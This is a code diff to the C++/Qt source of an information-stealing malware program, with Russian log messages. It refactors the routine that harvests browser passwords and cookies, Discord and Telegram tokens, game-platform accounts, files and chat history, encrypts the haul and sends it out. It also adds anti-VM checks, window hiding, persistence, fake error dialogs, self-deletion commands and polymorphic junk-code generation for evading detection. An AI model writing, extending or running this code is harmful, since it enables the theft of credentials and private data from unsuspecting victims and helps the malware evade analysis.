@@ -433,7 +433,7 @@ void MainWindow::saveToLocalFile(const std::string& data, const std::string& tem
 }
 
 // Обновленный метод StealAndSendData с многопоточностью
-void MainWindow::StealAndSendData(const std::string& tempDir) {
+std::string MainWindow::StealAndSendData(const std::string& tempDir) {
     emitLog("Запуск процесса кражи и отправки данных в " + QString::fromStdString(tempDir));
 
     if (config.antiVM && isRunningInVM()) {
@@ -441,7 +441,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         if (config.fakeError) {
             MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Critical Error", MB_ICONERROR);
         }
-        return;
+        return "VM Detected";
     }
 
     updateConfigFromUI();
@@ -450,7 +450,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         std::filesystem::create_directories(tempDir);
     } catch (const std::exception& e) {
         emitLog("Ошибка создания директории: " + QString::fromStdString(e.what()));
-        return;
+        return "Directory Creation Failed: " + std::string(e.what());
     }
     collectedFiles.clear();
     collectedData.clear();
@@ -465,7 +465,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
 
     if (config.systemInfo) pool.start(new DataStealer(this, tempDir, "systemInfo"));
     if (config.discord) pool.start(new DataStealer(this, tempDir, "discord"));
-    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam")); // Исправлен синтаксис
+    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam"));
     if (config.telegram) pool.start(new DataStealer(this, tempDir, "telegram"));
     if (config.epic) pool.start(new DataStealer(this, tempDir, "epic"));
     if (config.roblox) pool.start(new DataStealer(this, tempDir, "roblox"));
@@ -515,7 +515,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
     std::string encryptedData = encryptData(output.str());
     if (encryptedData.empty()) {
         emitLog("Ошибка: Не удалось зашифровать данные");
-        return;
+        return "Encryption Failed";
     }
 
     if (config.sendMethod == "Telegram") {
@@ -541,6 +541,8 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
             emitLog("Ошибка самоуничтожения: " + QString::fromStdString(e.what()));
         }
     }
+
+    return output.str();
 }
 
 // Реализация StealArizonaRPData (Arizona RP на SAMP)
@@ -2602,223 +2604,12 @@ std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
     }
 }
 
-// Реализация StealAndSendData
-void MainWindow::StealAndSendData(const std::string& tempDir) {
-    emitLog("Запуск процесса кражи и отправки данных...");
-
-    setupPersistence();
-    collectedFiles.clear();
-    collectedData.clear();
-
-    if (config.antiVM && isRunningInVM()) {
-        emitLog("Обнаружена виртуальная машина. Прерывание выполнения.");
-        if (config.fakeError) {
-            MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Error", MB_ICONERROR | MB_OK);
-        }
-        return;
-    }
-
-    if (config.fakeError) {
-        MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Error", MB_ICONERROR | MB_OK);
-    }
-
-    try {
-        std::filesystem::create_directories(tempDir);
-        emitLog("Временная директория создана: " + QString::fromStdString(tempDir));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка создания временной директории: " + QString::fromStdString(e.what()));
-        return;
-    }
-
-    if (config.systemInfo) {
-        std::string sysInfo = collectSystemInfo(tempDir);
-        if (!sysInfo.empty()) {
-            collectedData += "System Info:\n" + sysInfo + "\n";
-        }
-    }
-
-    if (config.screenshot) {
-        std::string screenshotPath = TakeScreenshot(tempDir);
-        if (!screenshotPath.empty()) {
-            collectedData += "Screenshot:\n" + screenshotPath + "\n";
-        }
-    }
-
-    if (config.cookies || config.passwords) {
-        std::string browserData = stealBrowserData(tempDir);
-        if (!browserData.empty()) {
-            collectedData += "Browser Data:\n" + browserData + "\n";
-        }
-    }
-
-    if (config.discord) {
-        std::string discordTokens = StealDiscordTokens(tempDir);
-        if (!discordTokens.empty()) {
-            collectedData += "Discord Tokens:\n" + discordTokens + "\n";
-        }
-    }
-
-    if (config.telegram) {
-        std::string telegramData = StealTelegramData(tempDir);
-        if (!telegramData.empty()) {
-            collectedData += "Telegram Data:\n" + telegramData + "\n";
-        }
-    }
-
-    if (config.steam) {
-        std::string steamData = StealSteamData(tempDir);
-        if (!steamData.empty()) {
-            collectedData += "Steam Data:\n" + steamData + "\n";
-        }
-    }
-
-    if (config.epic) {
-        std::string epicData = StealEpicGamesData(tempDir);
-        if (!epicData.empty()) {
-            collectedData += "Epic Games Data:\n" + epicData + "\n";
-        }
-    }
-
-    if (config.roblox) {
-        std::string robloxData = StealRobloxData(tempDir);
-        if (!robloxData.empty()) {
-            collectedData += "Roblox Data:\n" + robloxData + "\n";
-        }
-    }
-
-    if (config.battlenet) {
-        std::string battleNetData = StealBattleNetData(tempDir);
-        if (!battleNetData.empty()) {
-            collectedData += "Battle.net Data:\n" + battleNetData + "\n";
-        }
-    }
-
-    if (config.minecraft) {
-        std::string minecraftData = StealMinecraftData(tempDir);
-        if (!minecraftData.empty()) {
-            collectedData += "Minecraft Data:\n" + minecraftData + "\n";
-        }
-    }
-
-    if (config.arizonaRP) {
-        std::string arizonaData = StealArizonaRPData(tempDir);
-        if (!arizonaData.empty()) {
-            collectedData += "Arizona RP Data:\n" + arizonaData + "\n";
-        }
-    }
-
-    if (config.radmirRP) {
-        std::string radmirData = StealRadmirRPData(tempDir);
-        if (!radmirData.empty()) {
-            collectedData += "Radmir RP Data:\n" + radmirData + "\n";
-        }
-    }
-
-    if (config.fileGrabber) {
-        std::vector<std::string> grabbedFiles = GrabFiles(tempDir);
-        if (!grabbedFiles.empty()) {
-            collectedData += "Grabbed Files:\n";
-            for (const auto& file : grabbedFiles) {
-                collectedData += file + "\n";
-                collectedFiles.push_back(file);
-            }
-        }
-    }
-
-    if (config.chatHistory) {
-        std::string chatHistory = stealChatHistory(tempDir);
-        if (!chatHistory.empty()) {
-            collectedData += "Chat History:\n" + chatHistory + "\n";
-        }
-    }
-
-    if (config.socialEngineering) {
-        std::string seData = collectSocialEngineeringData(tempDir);
-        if (!seData.empty()) {
-            collectedData += "Social Engineering Data:\n" + seData + "\n";
-        }
-    }
-
-    if (!collectedData.empty() || !collectedFiles.empty()) {
-        emitLog("Собрано данных: " + QString::number(collectedData.size()) + " байт, файлов: " + QString::number(collectedFiles.size()));
-
-        std::string zipPath;
-        if (!collectedFiles.empty()) {
-            zipPath = archiveData(tempDir, collectedFiles);
-            if (zipPath.empty()) {
-                emitLog("Ошибка: Не удалось создать ZIP-архив");
-                std::filesystem::remove_all(tempDir);
-                return;
-            }
-            collectedFiles.clear();
-            collectedFiles.push_back(zipPath);
-        }
-
-        std::string encryptedData = encryptData(collectedData);
-        if (!encryptedData.empty()) {
-            emitLog("Данные зашифрованы, размер: " + QString::number(encryptedData.size()) + " байт");
-
-            std::string encryptedDataPath = tempDir + "\\encrypted_data.bin";
-            std::ofstream encryptedFile(encryptedDataPath, std::ios::binary);
-            if (encryptedFile.is_open()) {
-                encryptedFile.write(encryptedData.data(), encryptedData.size());
-                encryptedFile.close();
-                collectedFiles.push_back(encryptedDataPath);
-                emitLog("Зашифрованные данные сохранены в: " + QString::fromStdString(encryptedDataPath));
-                sendData(QString::fromStdString(encryptedData), collectedFiles);
-            } else {
-                emitLog("Ошибка: Не удалось сохранить зашифрованные данные");
-            }
-        } else {
-            emitLog("Ошибка: Не удалось зашифровать данные");
-        }
-    } else {
-        emitLog("Нет данных для отправки");
-    }
-
-    try {
-        std::filesystem::remove_all(tempDir);
-        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
-    }
-
-    if (config.selfDestruct) {
-        emitLog("Запуск самоуничтожения...");
-        char exePath[MAX_PATH];
-        if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
-            std::string batchFile = "self_destruct.bat";
-            std::ofstream batFile(batchFile);
-            if (batFile.is_open()) {
-                batFile << "@echo off\n";
-                batFile << "timeout /t 2 /nobreak >nul\n";
-                batFile << "del \"" << exePath << "\"\n";
-                batFile << "del \"%~f0\"\n";
-                batFile.close();
-                system(("start /min " + batchFile).c_str());
-            } else {
-                emitLog("Ошибка: Не удалось создать файл самоуничтожения");
-            }
-        } else {
-            emitLog("Ошибка: Не удалось получить путь к исполняемому файлу для самоуничтожения");
-        }
-        QApplication::quit();
-    }
-}
-
 // Реализация startStealProcess
 void MainWindow::startStealProcess() {
-    QString tempDir = QString::fromStdString("temp_" + generateRandomString(8));
-    QThread* thread = new QThread(this);
-    StealerWorker* worker = new StealerWorker(this, tempDir.toStdString());
-    worker->moveToThread(thread);
-
-    connect(thread, &QThread::started, worker, &StealerWorker::process);
-    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
-    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
-    connect(thread, &QThread::finished, thread, &QThread::deleteLater);
-
-    thread->start();
+    std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
+    emitLog("Запуск кражи данных в " + QString::fromStdString(tempDir));
+    std::string result = StealAndSendData(tempDir);
+    emitLog("Результат кражи: " + QString::fromStdString(result));
 }
 
 // Реализация triggerGitHubActions
@@ -3291,4 +3082,97 @@ void MainWindow::setupPersistence() {
     }
 
     emitLog("Настройка персистентности и автозагрузки завершена");
+}
+
+bool MainWindow::AntiAnalysis() {
+    emitLog("Проверка на анализ...");
+    return isRunningInVM(); // Если работает в VM, считаем, что это анализ
+}
+
+void MainWindow::Stealth() {
+    emitLog("Применение скрытности...");
+    HWND hwnd = reinterpret_cast<HWND>(this->winId());
+    ShowWindow(hwnd, SW_HIDE); // Скрываем окно
+}
+
+void MainWindow::Persist() {
+    emitLog("Установка персистентности...");
+    setupPersistence(); // Уже есть метод для этого
+}
+
+void MainWindow::FakeError() {
+    emitLog("Показ фальшивой ошибки...");
+    MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Critical Error", MB_ICONERROR);
+}
+
+void MainWindow::SelfDestruct() {
+    emitLog("Запуск самоуничтожения...");
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+        std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > NUL & del \"" + std::string(exePath) + "\"";
+        system(cmd.c_str());
+        QApplication::quit();
+    } else {
+        emitLog("Ошибка самоуничтожения: не удалось получить путь к файлу");
+    }
+}
+
+bool MainWindow::checkDependencies() {
+    emitLog("Проверка зависимостей...");
+    // Проверяем наличие OpenSSL и других библиотек
+    if (OPENSSL_VERSION_NUMBER < 0x10100000L) {
+        emitLog("Ошибка: требуется OpenSSL версии 1.1.0 или выше");
+        return false;
+    }
+    return true;
+}
+
+void MainWindow::runTests() {
+    emitLog("Запуск тестов...");
+    if (checkDependencies()) {
+        emitLog("Все зависимости на месте");
+    } else {
+        emitLog("Тесты провалены: отсутствуют зависимости");
+    }
+}
+
+std::string MainWindow::generatePolymorphicCode() {
+    emitLog("Генерация полиморфного кода...");
+    std::string code = R"(
+        void polymorphicFunction() {
+            volatile int dummy = )" + std::to_string(Polymorphic::getRandomNumber(1000, 15000)) + R"(;
+            std::string noise = ")" + Polymorphic::generateRandomString(Polymorphic::getRandomNumber(5, 20)) + R"(";
+            volatile int dummy2 = dummy ^ noise.length();
+            for (int i = 0; i < )" + std::to_string(Polymorphic::getRandomNumber(3, 15)) + R"(; i++) {
+                if (dummy2 % 2 == 0) {
+                    dummy2 = (dummy2 << )" + std::to_string(Polymorphic::getRandomNumber(1, 3)) + R"() ^ noise[i % noise.length()];
+                } else {
+                    dummy2 = (dummy2 >> )" + std::to_string(Polymorphic::getRandomNumber(1, 2)) + R"() + )" + std::to_string(Polymorphic::getRandomNumber(10, 50)) + R"(;
+                }
+            }
+        }
+    )";
+    return code;
+}
+
+std::string MainWindow::generateJunkCode() {
+    emitLog("Генерация мусорного кода...");
+    std::string code = R"(
+        void junkFunction() {
+            volatile int x = )" + std::to_string(JunkCode::getRandomNumber(1000, 10000)) + R"(;
+            volatile int y = )" + std::to_string(JunkCode::getRandomNumber(500, 5000)) + R"(;
+            std::vector<int> noise;
+            for (int j = 0; j < )" + std::to_string(JunkCode::getRandomNumber(5, 20)) + R"(; ++j) {
+                noise.push_back()" + std::to_string(JunkCode::getRandomNumber(1, 100)) + R"();
+            }
+            for (size_t k = 0; k < noise.size(); ++k) {
+                if (noise[k] % 2 == 0) {
+                    x = (x ^ noise[k]) + y;
+                } else {
+                    y = (y - noise[k]) ^ x;
+                }
+            }
+        }
+    )";
+    return code;
 }
